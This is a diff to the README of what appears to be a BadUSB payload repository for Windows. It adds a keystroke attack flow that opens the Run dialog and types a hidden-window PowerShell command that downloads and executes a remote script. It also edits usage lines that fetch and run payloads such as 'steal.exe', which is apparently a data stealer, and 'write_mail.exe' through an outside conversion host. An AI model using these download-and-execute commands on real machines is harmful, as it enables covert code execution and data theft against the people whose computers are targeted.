@@ -6,7 +6,32 @@
 > **Note** \
 > all code targets and has been tested for Windows
 
+# Attack flow
 
+<picture>
+  <source
+    srcset="assets/SimpleAttackFlowDark.png"
+    media="(prefers-color-scheme: dark)"
+  />
+  <source
+    srcset="assets/SimpleAttackFlow.png"
+    media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
+  />
+  <img src="assets/SimpleAttackFlow.png" />
+</picture>
+
+
+## Key pressed by BadUSB
+
+1. `WIN` + `r` which opens a command prompt
+    ![Windows 10 Run Command](assets/Windows10RunCommand.png)
+2. type `powershell -w h "IEX(iwr('URL'))"` where `URL` is  the url to a powershell script to execute
+3. `ENTER` to run the command
+
+## Keyboard layout
+The keyboard layout used for the BadUSB has to match the one chosen at the OS. \
+If this is not the case,
+some keys which are placed at different locations in the different layouts will output the wrong character.
 
 # Payloads
 
@@ -90,7 +115,7 @@ file: [rickroll.ps1](rickroll.ps1)
 
 #### usage
 ```shell
-powershell -w h -ep ByPass "IEX(iwr('is.gd/tuipo'))"
+powershell -w h "IEX(iwr('is.gd/tuipo'))"
 ```
 (download from this repo) \
 or
@@ -236,7 +261,7 @@ python build.py "steal.py"
 download from this repo
 (executes script at [`https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https://raw.githubusercontent.com/kaliiiiiiiiii/PublicDuckyChallenger/master/dist/steal.exe&arg=example@example.com`](https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com))
 ```shell
-powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com'))"
+powershell -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fsteal.exe&arg=example%40example.com'))"
 ```
 or execute the exe
 ```shell
@@ -262,7 +287,7 @@ python steal.py -h
 ### Build write Mail
 set up is similar to the other build
 ```shell
-powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
+powershell -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exehid?url=https%3A%2F%2Fraw.githubusercontent.com%2Fkaliiiiiiiiii%2FPublicDuckyChallenger%2Fmaster%2Fdist%2Fwrite_mail.exe&arg=example%40example.com'))"
 ```
 
 ## Acknowledgments
